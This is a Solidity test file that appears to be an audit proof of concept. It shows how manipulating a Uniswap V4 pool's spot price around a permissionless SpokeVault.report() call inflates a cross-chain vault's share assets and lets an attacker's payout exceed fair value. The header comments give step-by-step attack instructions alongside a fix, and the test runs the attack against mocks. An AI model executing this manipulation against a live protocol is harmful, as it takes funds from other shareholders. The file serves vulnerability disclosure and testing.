// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {IStateView} from "@uniswap/v4-periphery/src/interfaces/IStateView.sol";
import {IAllowanceTransfer} from "permit2/src/interfaces/IAllowanceTransfer.sol";

import {UniswapV4Adapter} from "../../../src/adapters/UniswapV4Adapter.sol";
import {ICoreVault} from "../../../src/interfaces/ICoreVault.sol";
import {MockPermit2} from "../../mocks/v4/MockPermit2.sol";
import {MockV4} from "../../mocks/v4/MockV4.sol";
import {CrossChainFixture} from "./helpers/CrossChainFixture.sol";

/// @title PoC: a report taken while the spoke pool's spot price is pushed overstates Share Assets on the hub
/// @notice Finding (medium). Lens: cross-chain messaging and bridging (what a spoke payload can do to the hub).
///
/// Root cause: `SpokeVault.report()` is permissionless and snapshots every Uniswap V4 position's token amounts at the
/// pool's CURRENT `slot0` price (`UniswapV4Adapter.positionValue` -> `_principal`). The hub then prices those amounts
/// with its own oracle (`CoreVaultLogic._positionsPrincipal` through `IPriceSource`). A liquidity position's
/// composition at the true price is the cheapest one on its curve, so the composition at ANY other pool price, valued
/// at the true price, is worth more: whoever moves the pool price inside the transaction that calls `report()` makes
/// the hub overstate the position. The report also carries `tickLower`, `tickUpper` and `liquidity`, which would let
/// the hub derive the amounts at the oracle price, but it does not use them, and the variation band (Q57 (d)) is not
/// enforced. The accepted report then prices every mint until the next report, and every Payout for as long as it is
/// the latest one (a Payout never checks the report's age).
///
/// Attack (a Shareholder with a Standard Payout Request whose term has ended, or any Shareholder using an Instant
/// Payout when the overstatement exceeds the 2% Payout Fee):
/// 1. In one transaction on Robinhood: swap in the fund's WETH/USDG pool until the price leaves the position's range,
///    call `SpokeVault.report()`, swap back. The cost is the pool's swap fee on the round trip; no price risk.
/// 2. When the guardians have signed the finalized message, deliver the VAA (`ValueReportReceiver.deliver`) and call
///    `CoreVault.claimPayout` in the same transaction.
///
/// Impact: here the fund keeps 899,550 USDG of its 1,196,550 USDC on the spoke in a position spanning about -33% to
/// +50% around the price. The manipulated report raises Share Assets by about 99,900 USDC (8.3%), and the attacker's
/// Payout takes about 16,600 USDC more than the shares are worth, out of Idle, at the expense of the remaining
/// Shareholder (an Instant Payout would still clear its 2% fee). The same
/// read happens for hub positions inside `claimPayout` itself (`ISpokeVault.buildReport` on the hub Spoke Vault), where
/// the manipulation and the claim fit in one transaction.
///
/// Fix: on the hub, derive each position's amounts from the reported `liquidity`, `tickLower` and `tickUpper` at the
/// oracle price (`sqrtPrice` from `IPriceSource`) instead of trusting `principal0` / `principal1` as read at spot; or
/// reject a report whose implied pool price deviates from the oracle price beyond a band (the Q57 (d) anomaly lock).
/// `setTick` on the pool stand-in plays the attacker's two swaps: moving `slot0` is all a swap does to this read.
contract SpotManipulatedReportPoC is CrossChainFixture {
    int24 internal constant RANGE = 4050; // 1.0001^4050 = 1.4993: the range spans -33% to +50% around the price.

    MockPermit2 internal permit2;
    MockV4 internal v4;
    PoolKey internal key;
    bytes32 internal poolId;
    bool internal wethIsToken0;
    int24 internal tick0;

    function _spokeCap() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function _beforeFundDeployment() internal override {
        permit2 = new MockPermit2();
        v4 = new MockV4(permit2);
        wethIsToken0 = address(spokeWeth) < address(usdg);
        (address c0, address c1) =
            wethIsToken0 ? (address(spokeWeth), address(usdg)) : (address(usdg), address(spokeWeth));
        key = PoolKey(Currency.wrap(c0), Currency.wrap(c1), 500, 10, IHooks(address(0)));
        poolId = PoolId.unwrap(key.toId());
        // 2,500 USDG per WETH: 2.5e-9 USDG base units per WETH base unit is tick -198,080; the inverse is +198,080.
        tick0 = wethIsToken0 ? int24(-198_080) : int24(198_080);
        v4.setTick(poolId, tick0);
        // The pool stand-in pays swap outputs from its own balance; USDG in, WETH out at 2,500.
        spokeWeth.mint(address(v4), 1000e18);
        v4.setSwap(4e26, 10_000);
    }

    function _deploySpokePositionAdapter(address predictedSpokeVault)
        internal
        override
        returns (address adapter, bytes32 poolKey)
    {
        PoolKey[] memory keys = new PoolKey[](1);
        keys[0] = key;
        adapter = address(
            new UniswapV4Adapter(
                predictedSpokeVault,
                guardian,
                IPoolManager(address(v4)),
                IPositionManager(address(v4)),
                IStateView(address(v4)),
                IAllowanceTransfer(address(permit2)),
                keys
            )
        );
        return (adapter, poolId);
    }

    function test_POC_spotManipulatedReportInflatesPayout() public {
        // Two Shareholders. The attacker holds one sixth of the shares.
        _deposit(alice, 1_000_000e6);
        (uint256 attackerShares,) = _deposit(attacker, 200_000e6);
        uint256 aliceShares = shares.balanceOf(alice);

        // The manager allocates 900,000 USDC to Robinhood and opens a WETH/USDG position around the price.
        (, uint256 depositId) = _sendToSpoke(900_000e6, 899_550e6);
        _fillOnSpoke(depositId);
        _openSpokePosition();
        _reportAndDeliver(900);
        uint256 honestAssets = core.shareAssets();
        assertApproxEqRel(honestAssets, 1_196_550e6, 0.001e18, "Idle 297,000 + spoke 899,550");

        // The attacker opens a Standard Payout Request for more than the shares are worth (DEC-020: the claim then
        // burns every share at the claim's Share Price) and waits for the term.
        vm.prank(attacker);
        core.requestPayout(250_000e6, ICoreVault.PayoutMode.Standard);
        skip(72 hours);
        _reportAndDeliver(900);
        assertApproxEqRel(core.shareAssets(), honestAssets, 0.0001e18, "nothing moved in 72 hours");
        uint256 fairValue = attackerShares / 1e18 * core.sharePrice() / 1e18;

        // 1. One transaction on the spoke: push the pool price out of the position's range, report, push it back.
        vm.chainId(SPOKE);
        v4.setTick(poolId, tick0 + RANGE);
        spoke.report();
        v4.setTick(poolId, tick0);
        uint256 manipulated = spokeWormhole.publishedCount() - 1;
        vm.chainId(HUB);

        // 2. Once the guardians signed it: deliver and claim in one transaction. The oracle price never moved.
        skip(900);
        _deliver(manipulated);
        uint256 inflatedAssets = core.shareAssets();
        assertGt(inflatedAssets, honestAssets + 99_000e6, "Share Assets overstated by more than 99,000 USDC");
        vm.prank(attacker);
        ICoreVault.PayoutReceipt memory receipt = core.claimPayout("");

        // The attacker's shares were paid about 16,600 USDC above their worth.
        assertEq(receipt.sharesBurned, attackerShares, "every share burned at the inflated price");
        assertGt(receipt.usdcGross, fairValue + 16_000e6, "paid above the shares' worth");

        // The next honest report shows who paid: Alice's shares lost what the attacker took in excess.
        _reportAndDeliver(900);
        uint256 aliceValueAfter = aliceShares / 1e18 * core.sharePrice() / 1e18;
        uint256 aliceValueBefore = aliceShares / 1e18 * (honestAssets * 1e36 / (aliceShares + attackerShares)) / 1e18;
        assertLt(aliceValueAfter + 16_000e6, aliceValueBefore, "taken from the remaining Shareholder");
    }

    /// @dev The manager swaps half of the USDG into WETH and opens one position over `tick0 +- RANGE`.
    function _openSpokePosition() internal {
        vm.chainId(SPOKE);
        vm.startPrank(manager);
        uint256 wethBought = spoke.swapExactInput(spokeAdapter, poolId, address(usdg), 445_000e6, 0, "");
        uint256 usdgLeft = spoke.unallocatedBalance(address(usdg));
        (uint256 amount0, uint256 amount1) = wethIsToken0 ? (wethBought, usdgLeft) : (usdgLeft, wethBought);
        spoke.openPosition(
            spokeAdapter,
            poolId,
            amount0,
            amount1,
            abi.encode(
                UniswapV4Adapter.OpenParams({
                    tickLower: tick0 - RANGE,
                    tickUpper: tick0 + RANGE,
                    liquidity: 0,
                    amount0Max: uint128(amount0),
                    amount1Max: uint128(amount1),
                    amount0Min: 0,
                    amount1Min: 0,
                    deadline: block.timestamp
                })
            )
        );
        vm.stopPrank();
        vm.chainId(HUB);
    }
}
